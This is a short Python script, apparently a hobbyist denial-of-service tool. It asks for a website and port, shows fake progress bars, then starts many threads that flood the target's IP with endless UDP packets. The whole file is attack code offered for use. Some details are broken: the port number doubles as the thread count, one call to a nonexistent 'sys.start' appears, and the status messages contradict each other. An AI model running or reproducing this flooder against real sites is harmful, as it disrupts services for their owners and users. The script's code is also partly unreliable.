#Salam
import requests
from pyfiglet import *
from datetime import datetime
from multiprocessing import Process
import time
import socket
import sys
import _thread
import os
C = '\033[96m'
W ='\033[1m'
w ='\033[5m'
R = '\033[91m'
O ='\033[4m'
Y = '\033[93m'
B = '\033[94m'
G = '\033[92m'
E = '\033[0m'
g = '\033[32m' 
r = '\033[31m' 
b = '\033[36m' 
p = '\033[35m'
d = '\033[34m' 
now = datetime.now()
dd = str(now.day) #Get Day
mm = str(now.month) #Get Month
yyyy = str(now.year) #Get year
hour = str(now.hour) #Get hour
mi = str(now.minute) #Get minute
ss = str(now.second) #Get Second
def slow(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(0.03)
		
slow(G + "■■■■■■■■■■■■■■■■■■■■■" + E)
slow(W + W + "■■■■■■■■■■■■■■■■■■■■■" + E + "      " + hour + ":" + mi + ":" + ss)
slow(R + W + "■■■■■■■■■■■■■■■■■■■■■" + E)
slow(Y +"Enter your site url: " + E)
site = input(Y + "~~~~~~~>     ")
slow(Y + "Enter your port: " + E)
thread_count = input(Y + "~~~~~~~~>    ")
ip = socket.gethostbyname(site)
PORT = int(thread_count)
os.system("clear")
MESSAGE = 'virus450' 
print(C +" IP:" + E, ip)
print(C + "port:" + E, PORT)
time.sleep(1)
os.system("clear")
slow(R + "[                    ] 0% " )
slow(Y + "[=====➣              ] 25%")
slow(W + C + "[==========➣          ] 50%" + w)
slow(B + "[===============➣      ] 75%")
slow(G + "[====================✔  ] 100%")
time.sleep(1)
os.system("clear")
print(W + "  Started DDos" + E)
time.sleep(1)
os.system("clear")
print(R + W + "    loading" + E)
time.sleep(2)
os.system("clear")
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip,PORT))
        
        print(R + "[Attack the packet sending website] (doing) <Not DDos>" + E)
        print(G + "سایت مورد نظر دیداس خورد (DDos Target)"  + E)
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.start(0)
        sys.exit(0)
while 9:
    pass
    